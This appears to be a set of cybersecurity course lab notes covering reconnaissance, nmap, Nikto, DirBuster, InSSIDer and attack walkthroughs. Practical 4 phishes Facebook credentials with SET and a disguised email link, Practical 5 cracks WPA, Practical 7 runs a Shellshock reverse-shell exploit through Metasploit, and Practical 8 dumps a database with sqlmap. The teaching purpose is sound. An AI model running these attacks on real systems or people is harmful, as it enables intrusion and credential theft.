@@ -1,0 +1,621 @@
+Cyber Practicals
+
+----------------------------------------------------------------------------------------------------------
+
+Practical 1
+
+Aim: Use of open-source intelligence and passive reconnaissance // Check other cyberprac1 note
+
+
+Theory: Recon-ng is a full-featured Web Reconnaissance framework written in Python. Complete with independent modules, database interaction, built in convenience functions, interactive help, and command completion, Recon-ng provides a powerful environment in which open-source web-based reconnaissance can be conducted quickly and thoroughly.
+
+Working: 
+
+1. Open Kali Linux Virtual Machine. And Open Terminal.
+2. Type recon-ng to enter the console.
+
+3. Initially there are no modules installed. To install the modules, we need to use the following commands:
+Discovery module
+marketplace install discovery
+
+Recon module
+marketplace install recon
+
+Importing module
+marketplace install import
+
+Exploitation module
+marketplace install exploitation
+
+Reporting module
+marketplace install reporting
+
+
+Now the required modules are installed.
+
+4. To create a new workspace
+workspaces list
+
+
+5. Install the module recon/domains-contacts/whois_pocs and load the installed module.
+ 	marketplace install recon/domains-contacts/whois_pocs
+
+
+6. Set the option and run the module.
+	options list
+	run
+
+
+7. Type back and enter the workspace. We will install another module recon/profiles-profiles/namechk and load the module to validate the user Brandon Stout.
+
+
+8. Set the option and run the module.
+
+
+9. Type back and enter the workspace. We will install another module recon/profiles-profiles/profiler to check the existence of user Brandon Stout.
+	marketplace install recon/profiles-profiles/profiler
+	modules load recon/profiles-profiles/profiler
+
+
+10. Set the option and run the module.
+	options list
+	run
+
+
+11. Generate a Report. We will install another module reporting/html and load the module to generate a report in html file.
+	back
+	marketplace install reporting/html
+
+
+
+Set the option and run the module.
+
+
+
+12. Html file is generated in given location. Go to the location and double click on the file.
+
+
+
+B. Windows Command Line Utilities
+
+1. Ping: Ping is a command line utility, available on virtually any operating system with network connectivity, that acts as a test to see if a networked device is reachable. The ping command sends a request over the network to a specific device.
+
+
+Get the Public IP of the given domain. Check the size of the packet which can be received by the destination.
+
+
+
+Check how much TTL router would take to discard the packet.
+
+
+
+2. Tracert using Ping
+
+
+
+3. Tracert: Traceroute is a network diagnostic tool used to track in real-time the pathway taken by a packet on an IP network from source to destination, reporting the IP addresses of all the routers it pinged in between. Traceroute also records the time taken for each hop the packet makes during its route to its destination.
+
+
+
+
+4. NSLookup: NSLookup (from name server lookup) is a network administration command-line tool for querying the Domain Name System (DNS) to obtain domain name or IP address mapping, or other DNS records.
+
+
+
+
+--------------------------------------------------------------------------------------------------------------------
+
+Practical 2
+
+
+Aim: Practical on enumerating host, port, and service scanning
+
+Theory: Enumeration of various services that are running on a target machine using Nmap. To enumerate services on target machine, perform the following steps: 1. Launch Kali Linux
+
+Working:
+
+To enumerate services on target machine, perform the following steps: 
+
+1. Launch Kali Linux
+2. Select Applications > Information Gathering >nmap, as shown in the Figure.
+
+Then the following screen will appear, as shown in Figure.
+
+
+3. Type ‘nmap -sP 192.xx.xx.xx/2’, and press Enter.
+
+Then 'Nmap' will scan all the nodes on the given network range and display all the hosts that are running, as shown in Figure.
+
+
+4. Type 'nmap -sS <IP address of the target machine>', and press Enter 
+(here we have used 192.XX.XX.XX as the IP address).
+
+
+Then a Stealthy synscan will be initiated, and all the open ports that are running on the machine will be displayed, as shown in Figure.
+
+
+Now, we can see all the open ports along with the services. We will find the version of each of these services running on the open port by performing a syn scan with the version detection switch.
+
+5. Type 'nmap -sSV -O <IP address of the target machine>', and pressEnter, as shown in Figure.
+
+
+Now, the Nmap performs the scan and displays the versions of the services, as shown in Figure.
+
+
+We have found the enumerated result. We will now save the scan result.
+
+6. Type 'nmap -sSV -0 <IP address of the target machine> -oN Enumeration.txt', and press Enter, as shown in Figure.
+
+
+Then the following screen will appear, as shown in Figure.
+
+
+Nmap will now perform Stealthy Scan with version and OS detection, and save the result in a text file (Enumeration.txt), which will be located on home (root) directory.
+
+7. Click on Places > Home Folder, as shown in Figure.
+
+
+8. Double click on the file Enumeration.txt, as shown in Figure.
+
+
+Then the following window will appear, as shown in Figure.
+
+
+You can also check the scanning result in the command line terminal. 
+
+Type 'cat Enumeration.txt', and press Enter, as shown in Figure.
+
+
+Then the output of the scanning process will be shown in the command line terminal, as shown in Figure.
+
+
+Summary
+
+We have demonstrated how to enumerate the services that are running on the target machine and find the vulnerabilities of the services.
+
+
+
+
+
+---------------------------------------------------------------------------------------------------------------------
+
+Practical 3
+
+
+Aim: Practical on vulnerability scanning and assessment 
+
+Theory: 
+We will demonstrate how to: Perform vulnerability analysis using Nikto. In order to carry out this lab, you will require the following: 1.Administrator privileges 2.Web browser with Internet connection 3.Kali Linux 
+
+Working: 
+
+To  set  up  Kali  Linux  for  vulnerability  scanning  and  use  Nikto  to  scan  for  known vulnerabilities, perform the following steps: 
+
+1.Log in to Kali Linux and open Terminal, as shown in Figure
+
+
+2.Type the command nikto -h http://testphp.vulnweb.com/listproducts.php?cat=1 and press Enter
+
+3.Note a vulnerability number, for example 23654, and open a web browser 
+
+4.Type the URL https://cve.mitre.org/ in the browser to open the Common Vulnerabilities and Exposures website, as shown in Figure
+
+
+5. Click on Search CVE List and type your vulnerability number in the text box, as shown in Figure and press enter
+
+
+
+It will give a list of vulnerability details, as shown in Figure
+
+
+
+
+---------------------------------------------------------------------------------------------------------------
+
+Practical 4
+
+
+Aim: Practical on use of Social Engineering Toolkit 
+
+Theory: 
+Sniffing Facebook credentials using Social Engineering Toolkit. We will require the following: 1. Kali Linux as virtual machine 2. Web browser with Internet connection 3. Administrative privileges.
+
+Working: 
+
+To perform social engineering and obtain the credentials of the target user, perform the following steps: 
+
+1.Log in to Kali Linux as a Virtual Machine. 
+2.Go to Applications > Exploitation Tools > SET Social Engineering Tool, as shown in Figure 1.
+
+
+Then you will get the Set menu, as shown in Figure 2.
+
+
+Now the list of social engineering methods will appear, as shown in Figure 3.
+
+3.Type ‘1’ to choose the Social Engineering Attacks, as shown in Figure 3. 
+
+
+Then  the  list  of  menus  in  the  social  engineering  attacks  will  appear,  as  shown  in Figure 4. 
+
+4.Type ‘2’to choose the Website attack vectors, as shown in Figure 4. 
+
+
+5.In the next screen that appears, type ‘3’ to choose the credential harvester attack method, as shown in Figure 5. 
+
+
+Then the following screen will appear, as shown in Figure 6.
+
+
+6.Type ‘2’ to choose Site Cloner, as shown in Figure 7. 
+
+
+Then the following screen will appear, as shown in Figure 8. 
+
+Now it will prompt for IP address for the PostBack in Harvester/Tabnabbing, as shown in Figure 8.
+
+7.Type the IP address of the Kali Linux of VM. Here, we have used 192.XX.XX.XX as the IP address, as shown in Figure 9.
+
+Then it will prompt to enter the URL of the website which is required to be cloned. 
+
+8.Type www.facebook.com, as shown in Figure 10.
+
+9.Type www.facebook.com, as shown in Figure 10.
+
+
+Then the following screen will appear, as shown in Figure 11
+
+
+10.Launch a web browser in Kali Linux and open an email service, as shown in Figure 12. 11.Compose an email and provide the target users email id in the To textbox, as shown in Figure 
+
+
+12.Click on the link icon. 
+
+The following window will appear, as shown in Figure 13. 
+
+13.Type a text in the Text to display textbox. (Figure 13) 
+14.Click on the radio button Web address. (Figure 13) 
+15.Type the fake URL https://facebook.com/ in the Web address text box. (Figure 13). 
+16.Click on OK. (Figure 13)
+
+
+Now the text that you have typed will appear in the email body as a link, as shown in Figure 14.
+ 17.Click on Send. (Figure 14) 
+
+
+Now when the target user will open his email, he will find the link, as shown in Figure 15.
+
+
+When the target user will click on the link, he/she will be presented with a replica of Facebook.com, as shown in Figure 16.
+
+
+The fake Facebook.com page will ask the target user to enter the email and password tor view the pictures. When the target user enters the credentials, the SET terminal of Kali Linux will fetch the email id and password
+
+
+
+
+
+
+---------------------------------------------------------------------------------------------------------------
+
+Practical 5
+
+
+Aim: Practical on Wireless and Bluetooth attacks
+
+Theory: Crack WPA encryption using Aircraft-ng in Kali Linux. We will require the following: 1. Kali Linux as virtual machine 2. Web browser with Internet connection 3. Administrative privileges.
+
+Working: 
+
+You can crack a wireless network encrypted with WPA by using the following steps.
+
+Log in to Kali and launch the command terminal.
+First, check if the wireless card is connected or not by using the ‘iwconfig’ command, as shown in figure.
+
+
+Change the wireless interface into monitor mode using ‘airmon-ng start wlan0’ command with wlan0 as your wireless interface name.
+
+
+Use ‘airodump’ to find out the SSID on the interface using the command: ‘airodump-ng --write capture wlan0’. The screen will display a list of wifi networks.
+
+
+Use the following command to capture a 4-way handshake by using airmon-ng to monitor traffic on the target network using the channel and BSSID values.
+‘airodump-ng -c 3 --bssid 9C:5C:XX:XX:XX:XX -w.wlan0’
+Where, ‘-c 3’ is used to specify the channel number 3
+Now, wait to capture the handshake packet. Once you have captured a packet, you will see the output similar to Figure
+
+
+You will see a captured .cap file in your /root location which is a default location.
+Now, run this captured file against a wordlist to crack the WPA key.
+
+
+
+
+
+--------------------------------------------------------------------------------------------------------------------
+
+Practical 6
+
+
+Aim:  Practical on Exploiting Web-based applications
+
+Theory: We will demonstrate how to: Enumerate a webserver by finding files and directories using DirBuster. In order to carry out this lab, you will require the following: 
+1.Administrator privileges 2.Kali Linux machine
+
+Working: 
+
+To  enumerate  a  webserver  by  finding  files  and  directories  using  DirBuster,  perform the following steps: 
+
+1.Login to Kali Linux machine. 
+
+2.Go to Applications -> Kali Linux -> Web Applications -> Web Crawlers -> dirbuster to launch DirBuster as shown in Figure 1.
+
+
+When it is launched, it opens in a GUI.
+
+
+3.Type the URL of the website you want to scan in the Target URL text field and the port number http://testphp.vulnweb.com:80
+
+
+4.Click on List Info to open a wordlist to be used to find the directories and files. 
+
+
+When you click on List Info, it opens a Brute Forcing List Information window listing all the available wordlists with a short description.
+
+
+5.Select a list you want to use and click on Browse to open that list. (You may need to download from github)
+
+6.It will open a Please Select The Directory/File List You Wish To Use window.
+
+7.Browse where your file is saved and select the list by clicking on Select List. 
+
+
+8.Click on the Start button. When you click on Start, DirBuster starts generating GET requests and sending them to the selected URL with a request for each of the files and directories listed in the wordlist. Figure 8 shows the scan information.
+
+
+After running DirBuster for some time, you will see the results in Tree View.
+
+
+
+
+
+
+------------------------------------------------------------------------------------------------------------------
+
+Practical 7
+
+
+Aim:  Practical on using Metasploit Framework for exploitation. 
+
+Theory: 
+We will demonstrate how to: Exploit Shellshock vulnerability using Metasploit. In order to carry out this lab, we will require the following: 1.Administrator privileges 2.Kali Linux machine as VM 3.Windows 8.1 machine 
+
+Working:
+
+1. To exploit vulnerability in a webserver using Metasploit, perform the following steps: 1.Open a web browser on the Windows 8.1 machine and type www.google.com in the URL. In the Google search bar, type shellshock vm and press Enter. It will give you a list of results. Open the result shown in Figure.
+
+
+2. Scroll down the Pentesterlab page and click on here as shown in Figure, to download the ISO of a VM with Shellshock vulnerability
+
+
+3. Open the VMWare Workstation Pro after the VM is downloaded and click on Create a New Virtual Machine as shown in Figure.
+
+
+It will start the New Virtual Machine Wizard as shown in Figure.
+
+Select the Typical (recommended) radio button and click on Next, as shown in Figure
+
+
+4. It will open the Guest Operating System Installation window as shown in Figure
+5. Click on Browse and navigate to the ISO you have downloaded in Step 2. Click
+on Next as shown in Figure
+
+
+It will open a Select a guest operating system window as shown in Figure
+6. Leave the options to default and click Next as shown in Figure
+
+
+It will open the Name the virtual machine window as shown in Figure.
+
+Type shellshock in the Virtual Machine name: text box and click on Next as shown in
+Figure 
+
+
+It will open a Specify Disk Capacity window as shown in Figure
+7. Leave the options to default and click on Next as shown in Figure
+
+8. Review the settings and click on Finish, as shown in Figure
+
+
+9.
+10. It will start installing the virtual machine. When the virtual machine will be
+completely installed, it will show you a command-line window as shown in Figure.
+
+
+11. Type the command ifconfig and press Enter to view the IP address configuration
+of the machine, as shown in Figure
+
+
+12. Switch and login to the Kali Linux VM. Open a web browser as shown in Figure
+
+
+13. Type http://192.168.0.109 and press Enter to check if the webs server is up and running, as shown in Figure. Here, 192.168.0.109 is the IP address of the shellshock VM.
+
+
+14. Type http://192.168.0.109/cgi-bin/status and press Enter to check if there is a
+shellshock vulnerability in the webserver, as shown in Figure. If it shows an output as
+shown in Figure, then there is a shellshock vulnerability
+
+
+15. Open the Metasploit tool. It will open a window, as shown in Figure
+
+16. Type the command ‘use exploit/multi/http/apache_mod_cgi_bash_env_exec’ and press Enter to select the exploit, as shown in Figure
+
+
+17.Set the lhost using the command ‘set LHOST 192.168.0.133’ and press Enter. The
+IP of the Kali Linux is 192.168.0.133, as shown in Figure.
+
+
+18. Set the rhost using the command ‘set RHOST 192.168.0.109’ and press Enter. The IP
+of the Shellshock VM is 192.168.0.109, as shown in Figure
+
+
+19. Set the TargetURI using the command ‘set TARGETURI /cgi-bin/status’ and press Enter, as shown in Figure
+
+
+20. Set the payload using the command ‘set payload linux/x86/meterpreter/reverse_tcp’, and press Enter, as shown in Figure
+
+
+21. Type ‘exploit’ and press Enter to run the exploit in the background, as shown in Figure 102. It will open a Meterpreter session 
+
+
+From this opened meterpreter session, you can perform the following tasks: View the files and directories located in the machine, Delete, upload and download files from the machine, Execute applications remotely,
+
+List the processes,
+Launch a shell,
+Reboot or shutdown the machine, etc.
+
+22. Type help and press Enter to view the help on the meterpreter commands, as
+shown in Figure
+
+23. Type arp and press Enter to view the ARP cache, as shown in Figure
+
+24. Type ipconfig and press Enter to view the IP configuration, as shown in Figure
+
+
+
+
+
+------------------------------------------------------------------------------------------------------------------
+
+Practical 8
+
+
+Aim:  Practical on injecting Code in Data Driven Applications: SQL Injection
+
+Theory: 
+We will demonstrate how to test a website for SQL injection vulnerability. In order to carry out this lab, we will require the following: 1.Administrator privileges 2.Web browser with Internet connection 3.Kali Linux
+
+Working:
+
+To test a website for SQL injection vulnerability, perform the following steps: 
+
+1.Log in to Kali Linux. 
+
+2.Open a web browser and enter the URL of the website you want to exploit.
+http://testphp.vulnweb.com/listproducts.php?cat=1
+
+If a URL, for example http://testphp.vulnweb.com/listproducts.php?cat=1,has a GET parameter as cat=1, then it is vulnerable to SQL injection attacks.
+
+3. You can check if your website is vulnerable by replacing the value 1 with * in GET parameter. If the website results in an error as shown in Figure 2, then it is vulnerable.
+http://testphp.vulnweb.com/listproducts.php?cat=*
+
+
+4. Open Terminal in Kali Linux as shown in Figure.
+
+
+5. Type sqlmap -h and press Enter to view the help and the list of parameters passed in
+the SQLMAP, as shown in Figure.
+
+
+6. Type the following command and press Enter to list the information about the existing databases.
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs
+
+
+Enter  N  when  SQLMAP  asks  to  skip  payload  for  other  databases  except  for  the
+detected database.
+Enter N again when SQLMAP asks to include all tests.
+
+
+In output part-3, you can see the executed payloads, available databases and backend database version.
+
+7. Type the following command and press Enter to list information about tables present
+in a particular database, as shown in Figure 6(a):
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables
+
+
+8. Type the following command and press Enter to list information about the columns of a particular table, as shown in Figure 7(a): 
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T products --columns 
+
+
+9. Type the following command and press Enter to dump the data from the columns: 
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T products -C name --dump 
+
+
+
+------------------------------------------------------------------------------------------------------------------
+
+Practical 9
+
+
+Aim:  Wireless Network threats (sniff wifi hotspots, analyze strength, discover wireless access points)
+
+Theory: 
+We will use InSSIDer to check the wireless network strength. We will learn how to: 1. Install and configure InSSIDer. 2. Check the wireless signal strength. To carry out this lab, you will require the following: 1.Windows OS 2.Web browser with Internet connection 3.Administrative privileges.
+
+Working:
+
+To detect the wireless network strength, execute the following steps: 
+
+1.Type https://inssider.en.softonic.com/download in the address bar of a web browser, and press Enter, as shown in Figure. 
+
+2.In the webpage that opens, click on the link, Download InSSIDer for Windows, as shown in Figure 3.Click on Free Download, as shown in Figure 
+
+
+3.Click on Free Download, as shown in Figure 
+
+
+4.Click on the downloaded files, as shown in Figure 
+
+
+5.In the next screen that appears, click on Next, as shown in Figure 
+
+
+6.In the next screen, click on the Everyone radio button,and then click Next, as shown in Figure 
+
+
+
+7.In the next screen that appears, click on Next, as shown in Figure 
+
+
+8.Then the following screen will appear, as shown in Figure
+
+
+9.Then after the files gets installed, the following screen will appear, as shown in Figure. Click Close 
+
+
+Then InSSIDer icon will appear on the desktop.
+
+10.Double click on the InSSIDer icon on the desktop. Then the following screen will appear, as shown in Figure.
+
+
+11.Click on the Time Graph tab, as shown in Figure 
+
+
+It will show the time graph of all the available SSID. We need to elect the particular SSID what we need to know
+
+12.Click on the particular SSID as shown in Figure 12. In this lab we have selected WSTREAM AP0 SSID 
+
+
+Now you have to select another SSID for comparison
+
+13.Scroll down the SSID and select WStream AP -1, as shown in Figure. 
+
+
+14.Then the following screen will appear, as shown in Figure
+
+15.Click on the 2.4 GHz channels tab, as shown in Figure 
+
+
+16. It will show 2.4 Ghz channels for two SSIDs,WStreamAP1 and WStream AP0.
+
+17.Click on the 5 Ghz channel, as shown in Figure. 
+Then the following screen will appear as shown in Figure.
+
+
+Thus, you can see the signal strength for both the SSIDs. In this way, we can analyze wireless network strength with the help of InSSIDer tool
+
+
+
+
+
